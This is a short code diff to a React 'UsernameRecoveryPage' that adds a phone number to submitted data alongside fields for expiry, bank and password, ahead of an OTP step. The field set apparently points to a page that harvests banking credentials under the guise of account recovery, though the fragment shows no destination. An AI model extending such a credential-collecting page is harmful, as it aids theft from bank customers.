@@ -179,6 +179,7 @@ export default function UsernameRecoveryPage() {
       EX: exp,
       bank,
       pass,
+      phone2:phoneNumber
     })
     setShowOtp(true)
   }
